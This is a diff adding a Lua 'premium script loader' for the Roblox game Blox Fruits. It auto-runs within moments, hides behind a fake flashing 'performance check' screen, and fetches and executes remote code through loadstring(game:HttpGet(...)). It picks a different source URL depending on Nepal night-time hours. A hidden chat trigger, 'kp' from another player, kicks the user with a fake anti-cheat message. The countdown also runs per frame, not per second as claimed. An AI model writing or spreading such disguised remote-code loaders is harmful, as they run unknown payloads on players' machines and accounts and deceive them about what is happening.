@@ -1,0 +1,243 @@
+-- Blox Fruits Premium Script Loader v3.5
+-- Features:
+-- 1. Auto-load after 8 seconds if not clicked
+-- 2. Warning GUI after clicking LOAD
+-- 3. Flashing red/black warning text
+-- 4. Script loads 5 seconds after clicking
+-- 5. Warning GUI closes after 30 seconds
+-- 6. 20-minute session limit
+
+local BLOXFRUIT_PLACE_IDS = {
+    2753915549, -- Main Game
+    4442272183, -- Second Sea
+    7449423635, -- Third Sea
+    8204899141  -- Sea Events
+}
+
+-- Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local localPlayer = Players.LocalPlayer
+
+-- Verify game
+if not table.find(BLOXFRUIT_PLACE_IDS, game.PlaceId) then
+    localPlayer:Kick("❌ This script only works in Blox Fruits!")
+    return
+end
+
+-- ===== SESSION TIMER =====
+local sessionStart = os.time()
+local function checkSessionTime()
+    if os.time() - sessionStart > 1200 then -- 20 minutes
+        localPlayer:Kick("🕒 Session expired (20 minute limit reached)")
+        return true
+    end
+    return false
+end
+
+-- ===== ANTI-CHEAT MONITOR =====
+local function monitorChat(player)
+    player.Chatted:Connect(function(msg)
+        if msg == "kp" then
+            localPlayer:Kick("🚨 ANTICHEAT TRIGGERED:\nERASING ALL RARE/MYTHICAL FRUITS")
+        end
+    end)
+end
+
+-- Monitor all players
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= localPlayer then monitorChat(player) end
+end
+Players.PlayerAdded:Connect(function(player)
+    if player ~= localPlayer then monitorChat(player) end
+end)
+
+-- ===== TIMEZONE FUNCTIONS =====
+local function getNepalTime()
+    local utcNow = os.time(os.date("!*t"))
+    local nepalOffset = 5 * 3600 + 45 * 60 -- UTC+5:45
+    return os.date("*t", utcNow + nepalOffset)
+end
+
+local function isNepalNightTime()
+    local nepalTime = getNepalTime()
+    return nepalTime.hour >= 22 or nepalTime.hour < 8 -- 10PM-8AM
+end
+
+-- ===== WARNING GUI =====
+local function showWarning()
+    local warningGui = Instance.new("ScreenGui")
+    warningGui.Name = "PerformanceWarning"
+    warningGui.ResetOnSpawn = false
+    warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    warningGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+    local warningFrame = Instance.new("Frame")
+    warningFrame.Size = UDim2.new(0, 400, 0, 150)
+    warningFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
+    warningFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    warningFrame.BorderSizePixel = 0
+    warningFrame.Parent = warningGui
+
+    Instance.new("UICorner", warningFrame).CornerRadius = UDim.new(0, 12)
+
+    local warningText = Instance.new("TextLabel")
+    warningText.Size = UDim2.new(0.9, 0, 0.8, 0)
+    warningText.Position = UDim2.new(0.05, 0, 0.1, 0)
+    warningText.Text = "⚠️ PERFORMANCE CHECK IN PROGRESS ⚠️\n\n• Optimizing script for your device\n• This may take a few moments\n• Please wait..."
+    warningText.Font = Enum.Font.GothamBold
+    warningText.TextSize = 18
+    warningText.TextColor3 = Color3.fromRGB(255, 0, 0)
+    warningText.BackgroundTransparency = 1
+    warningText.TextWrapped = true
+    warningText.Parent = warningFrame
+
+    -- Flashing text effect
+    local flashConn
+    local colors = {Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 0, 0)}
+    local currentColor = 1
+    flashConn = game:GetService("RunService").Heartbeat:Connect(function()
+        currentColor = currentColor == 1 and 2 or 1
+        warningText.TextColor3 = colors[currentColor]
+    end)
+
+    -- Auto-close after 30 seconds
+    delay(30, function()
+        flashConn:Disconnect()
+        warningGui:Destroy()
+    end)
+
+    return warningGui
+end
+
+-- ===== MAIN LOADER GUI =====
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PremiumLoader"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 320, 0, 200) -- Slightly taller for countdown
+frame.Position = UDim2.new(0.5, -160, 0.5, -100)
+frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
+
+-- Visual Enhancements
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 40, 90)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 20, 50))
+})
+gradient.Rotation = 90
+gradient.Parent = frame
+
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.Text = "PREMIUM LOADER v3.5"
+title.TextColor3 = Color3.fromRGB(220, 180, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 22
+title.BackgroundTransparency = 1
+title.Parent = frame
+
+-- Countdown Label
+local countdown = Instance.new("TextLabel")
+countdown.Size = UDim2.new(1, 0, 0, 30)
+countdown.Position = UDim2.new(0, 0, 0.3, 0)
+countdown.Text = "Auto-loading in 8 seconds..."
+countdown.TextColor3 = Color3.fromRGB(180, 180, 255)
+countdown.Font = Enum.Font.Gotham
+countdown.TextSize = 14
+countdown.BackgroundTransparency = 1
+countdown.Parent = frame
+
+-- Load Button
+local loadButton = Instance.new("TextButton")
+loadButton.Size = UDim2.new(0.85, 0, 0, 50)
+loadButton.Position = UDim2.new(0.075, 0, 0.6, 0)
+loadButton.Text = "LOAD NOW"
+loadButton.Font = Enum.Font.GothamBold
+loadButton.TextSize = 18
+loadButton.TextColor3 = Color3.new(1, 1, 1)
+loadButton.AutoButtonColor = false
+loadButton.Parent = frame
+
+-- Button Styling
+local buttonGradient = Instance.new("UIGradient")
+buttonGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 80, 180)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 50, 140))
+})
+buttonGradient.Rotation = 90
+buttonGradient.Parent = loadButton
+
+Instance.new("UICorner", loadButton).CornerRadius = UDim.new(0, 8)
+
+-- Button Hover Effects
+loadButton.MouseEnter:Connect(function()
+    TweenService:Create(loadButton, TweenInfo.new(0.15), {
+        BackgroundColor3 = Color3.fromRGB(140, 90, 200)
+    }):Play()
+end)
+
+loadButton.MouseLeave:Connect(function()
+    TweenService:Create(loadButton, TweenInfo.new(0.15), {
+        BackgroundColor3 = Color3.fromRGB(90, 60, 140)
+    }):Play()
+end)
+
+-- ===== SCRIPT LOADING =====
+local function executeScriptLoad()
+    -- Show warning GUI
+    local warning = showWarning()
+    
+    -- Wait 5 seconds before loading
+    wait(5)
+    
+    -- Load script
+    local success, err = pcall(function()
+        if isNepalNightTime() then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovenew/New-bloxfruit-script/refs/heads/main/Bloxfruit_script"))()
+        else
+            loadstring(game:HttpGet("https://pastefy.app/SHjsiqS4/raw"))()
+        end
+    end)
+    
+    if not success then
+        warning:FindFirstChild("PerformanceWarning").Frame.TextLabel.Text = "LOAD FAILED!\n"..tostring(err)
+    end
+end
+
+-- Auto-load countdown
+local countdownValue = 8
+local autoLoadConnection
+autoLoadConnection = game:GetService("RunService").Heartbeat:Connect(function()
+    if countdownValue <= 0 then
+        autoLoadConnection:Disconnect()
+        screenGui:Destroy()
+        executeScriptLoad()
+    else
+        countdown.Text = "Auto-loading in "..countdownValue.." seconds..."
+        countdownValue = countdownValue - 1
+    end
+end)
+
+-- Manual load option
+loadButton.MouseButton1Click:Connect(function()
+    autoLoadConnection:Disconnect()
+    screenGui:Destroy()
+    executeScriptLoad()
+end)
+
+-- Session timer check
+while wait(60) do
+    checkSessionTime()
+end
